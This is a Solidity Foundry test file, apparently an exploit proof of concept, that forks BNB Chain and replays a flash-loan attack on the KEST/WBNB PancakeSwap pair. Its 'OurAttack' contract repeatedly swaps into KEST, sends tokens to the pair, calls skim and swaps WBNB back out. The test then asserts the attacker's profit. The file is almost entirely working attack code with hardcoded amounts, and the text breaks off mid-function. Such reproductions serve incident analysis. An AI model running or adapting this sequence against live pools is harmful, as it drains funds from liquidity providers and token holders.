
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34402343;
    uint256 constant TX_TIMESTAMP = 1702723254;
    uint256 constant TX_BLOCK_NUMBER = 34402344;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _startAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal pure returns (address) {
        attack;
        return address(0);
    }

    function _startAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attacker_eoa, address(0), Addresses.Cake_LP, "Cake-LP", 2146320284844256899722
        );
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 9019657610212775442);
        _expectProfit(Addresses.attack_contract, attack, Addresses.ZERO, "BNB", 53281539038);
    }
}

contract OurAttack {
    function attack() external payable {
        _borrowFlashLoan();
    }

    function flashLoanCallback() internal {
        _callbackDone[FLASH_CALLBACK] = true;


        _swapWbnbToKest1();
        _readKestBalance1();
        _quotePairMint();
        _sendWbnbToPair1();
        _readKestBalance2();
        _sendKestToPair1();
        _mintCakeLp();
        _readWbnbBalance1();
        _swapWbnbToKest2();
        _readKestBalance3();
        _readKestBalance4();
        _sendKestToPair2();
        _skimPair1();
        _readPairKest1();
        _quotePairSwap1();
        _swapPairToWbnb1();
        _readWbnbBalance2();
        _buyExactKest1();
        _removeKestLp1();
        _readKestBalance5();
        _swapKestToWbnb1();
        _swapWbnbToKest3();
        _readKestBalance6();
        _sendKestToPair3();
        _skimPair2();
        _readPairKest2();
        _quotePairSwap2();
        _swapPairToWbnb2();
        _readWbnbBalance3();
        _buyExactKest2();
        _removeKestLp2();
        _readKestBalance7();
        _swapKestToWbnb2();
        _readWbnbBalance4();
        _swapWbnbToKest4();
        _readKestBalance8();
        _sendKestToPair4();
        _skimPair3();
        _readPairReserves1();
        _readPairKest3();
        _quotePairSwap3();
        _swapPairToWbnb3();
        _readWbnbBalance5();
        _buyExactKest3();
        _removeKestLp3();
        _readKestBalance9();
        _swapKestToWbnb3();
        _readWbnbBalance6();
        _swapWbnbToKest5();
        _readKestBalance10();
        _readKestBalance11();
        _sendKestToPair5();
        _skimPair4();
        _readPairKest4();
        _quotePairSwap4();
        _swapPairToWbnb4();
        _readWbnbBalance7();
        _buyExactKest4();
        _removeKestLp4();
        _readKestBalance12();
        _swapKestToWbnb4();
        _readWbnbBalance8();
        _swapWbnbToKest6();
        _readKestBalance13();
        _sendKestToPair6();
        _skimPair5();
        _readPairKest5();
        _quotePairSwap5();
        _swapPairToWbnb5();
        _readWbnbBalance9();
        _buyExactKest5();
        _removeKestLp5();
        _readKestBalance14();
        _swapKestToWbnb5();
        _readWbnbBalance10();
        _swapWbnbToKest7();
        _readKestBalance15();
        _sendKestToPair7();
        _skimPair6();
        _readPairKest6();
        _quotePairSwap6();
        _swapPairToWbnb6();
        _readWbnbBalance11();
        _buyExactKest6();
        _removeKestLp6();
        _readKestBalance16();
        _swapKestToWbnb6();
        _readWbnbBalance12();
        _swapWbnbToKest8();
        _readKestBalance17();
        _readKestBalance18();
        _sendKestToPair8();
        _skimPair7();
        _readPairKest7();
        _quotePairSwap7();
        _swapPairToWbnb7();
        _readWbnbBalance13();
        _buyExactKest7();
        _removeKestLp7();
        _readKestBalance19();
        _swapKestToWbnb7();
        _readWbnbBalance14();
        _swapWbnbToKest9();
        _readKestBalance20();
        _sendKestToPair9();
        _skimPair8();
        _readPairKest8();
        _quotePairSwap8();
        _swapPairToWbnb8();
        _readWbnbBalance15();
        _buyExactKest8();
        _removeKestLp8();
        _readKestBalance21();
        _swapKestToWbnb8();
        _readLpBalance();
        _collectLpProfit();
        _readWbnbBalance16();
        _collectWbnbProfit();
        _approveFlashRepay();
    }

    function _swapWbnbToKest1() internal {
        {
            uint256 swapAmountIn = 10000000000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readKestBalance1() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _quotePairMint() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .quote(492642116537074074095709580, 476800263566880696508210391122, 9471150031713293176);
    }

    function _sendWbnbToPair1() internal {
        {
            uint256 wbnbPairAmount = 9785832253444066;
            IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, wbnbPairAmount);
        }
    }

    function _readKestBalance2() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair1() internal {
        {
            uint256 kestPairAmount = 492642116537074074095709580;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _mintCakeLp() internal {
        ICake_LP(Addresses.Cake_LP).mint(address(this));
    }

    function _readWbnbBalance1() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest2() internal {
        {
            uint256 swapAmountIn = 199980214167746555934;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readKestBalance3() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance4() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair2() internal {
        {
            uint256 kestPairAmount = 446515326523463835200469937722;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair1() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest1() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap1() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(428833319593134667326531328189, 21655168633470870732997719448, 209461150031713293176);
    }

    function _swapPairToWbnb1() internal {
        {
            uint256 pairWbnbOut = 199368246265042846651;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance2() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest1() internal {
        {
            uint256 exactKestInput = 199368246265042846651;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        334886494892597876400352453291,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp1() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance5() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb1() internal {
        {
            uint256 swapAmountIn = 643249979494239590138759875914;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest3() internal {
        {
            uint256 swapAmountIn = 203341938971941390615;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance6() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair3() internal {
        {
            uint256 kestPairAmount = 709657830295397238954705894567;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair2() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest2() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap2() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(681555380215699508292099541143, 21846330025369864461953006926, 209461150013162268298);
    }

    function _swapPairToWbnb2() internal {
        {
            uint256 pairWbnbOut = 202939885063237631360;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance3() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest2() internal {
        {
            uint256 exactKestInput = 202939885063237631360;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        532243372721547929216029420925,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp2() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance7() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb2() internal {
        {
            uint256 swapAmountIn = 1022333070478106791445911550256;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance4() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest4() internal {
        {
            uint256 swapAmountIn = 205534955430235020543;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance8() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair4() internal {
        {
            uint256 kestPairAmount = 1127982760758182944298336257802;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair3() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
    }

    function _readPairReserves1() internal {
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest3() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap3() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(1083314643432158899704122141994, 22041929407414235435471827574, 209461150000539053021);
    }

    function _swapPairToWbnb3() internal {
        {
            uint256 pairWbnbOut = 205274023480178697397;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance5() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest3() internal {
        {
            uint256 exactKestInput = 205274023480178697397;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        845987070568637208223752193351,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp3() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance9() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb3() internal {
        {
            uint256 swapAmountIn = 1624971965382116224924109490915;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance6() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest5() internal {
        {
            uint256 swapAmountIn = 206951683082977632616;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readKestBalance10() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance11() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair5() internal {
        {
            uint256 kestPairAmount = 1793008923774782962474968842141;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair4() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest4() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap4() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(1722005770393301557160960075994, 22241085596319613983042792162, 209461149992146001040);
    }

    function _swapPairToWbnb4() internal {
        {
            uint256 pairWbnbOut = 206783679254450385948;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance7() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest4() internal {
        {
            uint256 exactKestInput = 206783679254450385948;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        1344756692831087221856226631605,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp4() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance12() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb4() internal {
        {
            uint256 swapAmountIn = 2583008655949660284956725215816;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance8() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest6() internal {
        {
            uint256 swapAmountIn = 207861157714771985349;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance13() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair6() internal {
        {
            uint256 kestPairAmount = 2850227521051990905631482687709;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair5() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest5() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap5() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(2737358511218332065768475973276, 22443216157042488222068754728, 209461149986655313305);
    }

    function _swapPairToWbnb5() internal {
        {
            uint256 pairWbnbOut = 207753539009565299770;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance9() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest5() internal {
        {
            uint256 exactKestInput = 207753539009565299770;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        2137670640788993179223612015781,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp5() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance14() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb5() internal {
        {
            uint256 swapAmountIn = 4106037767386864955072827275686;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance10() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest7() internal {
        {
            uint256 swapAmountIn = 208442636549802811076;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance15() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair7() internal {
        {
            uint256 kestPairAmount = 4530932151257846612185373200981;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair6() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest6() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap6() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(4351507238068035886342832422223, 22647943989552025165914443181, 209461149983102602383);
    }

    function _swapPairToWbnb6() internal {
        {
            uint256 pairWbnbOut = 208373924709538871622;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance11() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest6() internal {
        {
            uint256 exactKestInput = 208373924709538871622;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        3398199113443384959139029900735,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp6() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance16() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb6() internal {
        {
            uint256 swapAmountIn = 6527260857978275857000840313188;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance12() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest8() internal {
        {
            uint256 swapAmountIn = 208813445883192197094;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readKestBalance17() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance18() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair8() internal {
        {
            uint256 kestPairAmount = 7202820345849111327116029373984;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair7() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest7() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap7() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(6917588660153486518562234610775, 22855029538869024928369890138, 209461149980820526993);
    }

    function _swapPairToWbnb7() internal {
        {
            uint256 pairWbnbOut = 208769666918193496076;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance13() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest7() internal {
        {
            uint256 exactKestInput = 208769666918193496076;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        5402115259386833495337022030488,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp7() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance19() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb7() internal {
        {
            uint256 swapAmountIn = 10376382991609346040159501166215;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readWbnbBalance14() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _swapWbnbToKest9() internal {
        {
            uint256 swapAmountIn = 209049520167656918328;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        address(this),
                        1702723254
                    );
            }
        }
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _readKestBalance20() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _sendKestToPair9() internal {
        {
